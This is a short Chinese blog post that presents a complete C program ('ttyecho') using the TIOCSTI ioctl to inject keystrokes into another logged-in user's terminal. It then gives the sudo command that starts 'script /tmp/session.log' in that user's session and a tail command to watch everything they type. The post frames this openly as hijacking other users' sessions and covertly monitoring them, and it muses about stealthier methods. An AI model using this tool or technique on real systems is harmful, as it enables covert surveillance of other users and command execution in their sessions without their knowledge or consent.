---
title: linux监控其他登录用户做了什么事，以及劫持其他登录用户会话执行命令。
abbrlink: 57323
url: /posts/57323.html
date: 2021-01-29 10:33:10
tags:
---

应该还有更隐蔽的方法，不过目前是这样了。
 

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>

void print_help(char *prog_name) {
        printf("Usage: %s [-n] DEVNAME COMMAND\n", prog_name);
        printf("Usage: '-n' is an optional argument if you want to push a new line at the end of the text\n");
        printf("Usage: Will require 'sudo' to run if the executable is not setuid root\n");
        exit(1);
}

int main (int argc, char *argv[]) {
    char *cmd, *nl = "\n";
    int i, fd;
    int devno, commandno, newline;
    int mem_len;
    devno = 1; commandno = 2; newline = 0;
    if (argc < 3) {
        print_help(argv[0]);
    }
    if (argc > 3 && argv[1][0] == '-' && argv[1][1] == 'n') {
        devno = 2; commandno = 3; newline=1;
    } else if (argc > 3 && argv[1][0] == '-' && argv[1][1] != 'n') {
        printf("Invalid Option\n");
        print_help(argv[0]);
    }
    fd = open(argv[devno],O_RDWR);
    if(fd == -1) {
        perror("open DEVICE");
        exit(1);
    }
    mem_len = 0;
    for ( i = commandno; i < argc; i++ ) {
        mem_len += strlen(argv[i]) + 2;
        if ( i > commandno ) {
            cmd = (char *)realloc((void *)cmd, mem_len);
        } else { //i == commandno
            cmd = (char *)malloc(mem_len);
        }

        strcat(cmd, argv[i]);
        strcat(cmd, " ");
    }
  if (newline == 0)
        usleep(225000);
    for (i = 0; cmd[i]; i++)
        ioctl (fd, TIOCSTI, cmd+i);
    if (newline == 1)
        ioctl (fd, TIOCSTI, nl);
    close(fd);
    free((void *)cmd);
    exit (0);
}

```
编译以上代码为ttyecho
使用命令who发现有谁在登录当前的linux
比如其他用户的终端文件为/dev/pts/5，那么就使用以下命令在别人的终端下执行script /tmp/session.log命令。
```bash
sudo ttyecho -n /dev/pts/5 “script /tmp/session.log”
```
之后可以使用以下命令查看别人执行了什么。
```bash
tail -f /tmp/session.log
```

参考：http://www.humbug.in/2010/utility-to-send-commands-or-data-to-other-terminals-ttypts
